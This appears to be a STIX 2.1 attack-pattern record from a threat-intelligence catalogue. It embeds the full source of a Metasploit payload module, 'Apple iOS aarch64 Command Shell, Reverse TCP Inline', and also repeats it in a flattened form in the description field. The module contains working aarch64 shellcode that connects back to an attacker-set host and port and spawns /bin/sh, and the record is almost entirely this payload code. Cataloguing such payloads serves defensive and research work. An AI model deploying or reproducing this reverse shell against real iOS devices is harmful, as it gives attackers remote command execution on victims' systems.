{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--58ea82a4-9cbc-4229-a6ef-c4a3e74d9d1b",
    "created": "2024-08-14T16:33:19.34683Z",
    "modified": "2024-08-14T16:33:19.346834Z",
    "name": "Apple iOS aarch64 Command Shell, Reverse TCP Inline",
    "description": "Connect back to attacker and spawn a command shell 'License'       => MSF_LICENSE 'Platform'      => 'apple_ios' 'Arch'          => ARCH_AARCH64 'Handler'       => Msf::Handler::ReverseTcp 'Session'       => Msf::Sessions::CommandShellUnix 'Payload'       => { 'Offsets' => { 'LHOST'    => [ 132, 'ADDR' ] 'LPORT'    => [ 130, 'n' ]  'Payload' => [ # Generated from external/source/shellcode/apple_ios/aarch64/single_reverse_tcp_shell.s 0xd2800040,          #  mov\tx0, #0x2                   \t// #2 0xd2800021,          #  mov\tx1, #0x1                   \t// #1 0xd2800002,          #  mov\tx2, #0x0                   \t// #0 0xd2800c30,          #  mov\tx16, #0x61                  \t// #97 0xd4000001,          #  svc\t#0x0 0xaa0003e3,          #  mov\tx3, x0 0x10000341,          #  adr\tx1, 80 <sockaddr> 0xd2800202,          #  mov\tx2, #0x10                  \t// #16 0xd2800c50,          #  mov\tx16, #0x62                  \t// #98 0xd4000001,          #  svc\t#0x0 0x35000260,          #  cbnz\tw0, 74 <exit> 0xaa0303e0,          #  mov\tx0, x3 0xd2800002,          #  mov\tx2, #0x0                   \t// #0 0xd2800001,          #  mov\tx1, #0x0                   \t// #0 0xd2800b50,          #  mov\tx16, #0x5a                  \t// #90 0xd4000001,          #  svc\t#0x0 0xd2800021,          #  mov\tx1, #0x1                   \t// #1 0xd2800b50,          #  mov\tx16, #0x5a                  \t// #90 0xd4000001,          #  svc\t#0x0 0xd2800041,          #  mov\tx1, #0x2                   \t// #2 0xd2800b50,          #  mov\tx16, #0x5a                  \t// #90 0xd4000001,          #  svc\t#0x0 0x10000180,          #  adr\tx0, 88 <shell> 0xd2800002,          #  mov\tx2, #0x0                   \t// #0 0xf90003e0,          #  str\tx0, [sp] 0xf90007e2,          #  str\tx2, [sp,#8] 0x910003e1,          #  mov\tx1, sp 0xd2800770,          #  mov\tx16, #0x3b                  \t// #59 0xd4000001,          #  svc\t#0x0 0xd2800000,          #  mov\tx0, #0x0                   \t// #0 0xd2800030,          #  mov\tx16, #0x1                   \t// #1 0xd4000001,          #  svc\t#0x0 0x5c110002,          #  .word\t0x5c110002 0x0100007f,          #  .word\t0x0100007f 0x00000000,          #  .word\t0x00000000                // shell 0x00000000,          #  .word\t0x00000000 0x00000000,          #  .word\t0x00000000 0x00000000,          #  .word\t0x00000000 ].pack(\"V*\")  ))  # Register command execution options register_options( [ OptString.new('SHELL', [ true, \"The shell to execute.\", \"/bin/sh\" ]) ]) end  def generate(_opts = {}) p = super  sh = datastore['SHELL'] if sh.length >= 16 raise ArgumentError, \"The specified shell must be less than 16 bytes.\" end p[136, sh.length] = sh  p end end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/apple_ios/aarch64/shell_reverse_tcp.rb",
            "external_id": "shell_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 152\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Apple iOS aarch64 Command Shell, Reverse TCP Inline',\n      'Description'   => 'Connect back to attacker and spawn a command shell',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'apple_ios',\n      'Arch'          => ARCH_AARCH64,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' =>\n            {\n              'LHOST'    => [ 132, 'ADDR' ],\n              'LPORT'    => [ 130, 'n' ],\n            },\n          'Payload' =>\n            [\n            # Generated from external/source/shellcode/apple_ios/aarch64/single_reverse_tcp_shell.s\n            0xd2800040,          #  mov\tx0, #0x2                   \t// #2\n            0xd2800021,          #  mov\tx1, #0x1                   \t// #1\n            0xd2800002,          #  mov\tx2, #0x0                   \t// #0\n            0xd2800c30,          #  mov\tx16, #0x61                  \t// #97\n            0xd4000001,          #  svc\t#0x0\n            0xaa0003e3,          #  mov\tx3, x0\n            0x10000341,          #  adr\tx1, 80 <sockaddr>\n            0xd2800202,          #  mov\tx2, #0x10                  \t// #16\n            0xd2800c50,          #  mov\tx16, #0x62                  \t// #98\n            0xd4000001,          #  svc\t#0x0\n            0x35000260,          #  cbnz\tw0, 74 <exit>\n            0xaa0303e0,          #  mov\tx0, x3\n            0xd2800002,          #  mov\tx2, #0x0                   \t// #0\n            0xd2800001,          #  mov\tx1, #0x0                   \t// #0\n            0xd2800b50,          #  mov\tx16, #0x5a                  \t// #90\n            0xd4000001,          #  svc\t#0x0\n            0xd2800021,          #  mov\tx1, #0x1                   \t// #1\n            0xd2800b50,          #  mov\tx16, #0x5a                  \t// #90\n            0xd4000001,          #  svc\t#0x0\n            0xd2800041,          #  mov\tx1, #0x2                   \t// #2\n            0xd2800b50,          #  mov\tx16, #0x5a                  \t// #90\n            0xd4000001,          #  svc\t#0x0\n            0x10000180,          #  adr\tx0, 88 <shell>\n            0xd2800002,          #  mov\tx2, #0x0                   \t// #0\n            0xf90003e0,          #  str\tx0, [sp]\n            0xf90007e2,          #  str\tx2, [sp,#8]\n            0x910003e1,          #  mov\tx1, sp\n            0xd2800770,          #  mov\tx16, #0x3b                  \t// #59\n            0xd4000001,          #  svc\t#0x0\n            0xd2800000,          #  mov\tx0, #0x0                   \t// #0\n            0xd2800030,          #  mov\tx16, #0x1                   \t// #1\n            0xd4000001,          #  svc\t#0x0\n            0x5c110002,          #  .word\t0x5c110002\n            0x0100007f,          #  .word\t0x0100007f\n            0x00000000,          #  .word\t0x00000000                // shell\n            0x00000000,          #  .word\t0x00000000\n            0x00000000,          #  .word\t0x00000000\n            0x00000000,          #  .word\t0x00000000\n            ].pack(\"V*\")\n        }\n      ))\n\n    # Register command execution options\n    register_options(\n      [\n        OptString.new('SHELL', [ true, \"The shell to execute.\", \"/bin/sh\" ]),\n      ])\n  end\n\n  def generate(_opts = {})\n    p = super\n\n    sh = datastore['SHELL']\n    if sh.length >= 16\n      raise ArgumentError, \"The specified shell must be less than 16 bytes.\"\n    end\n    p[136, sh.length] = sh\n\n    p\n  end\nend\n"
}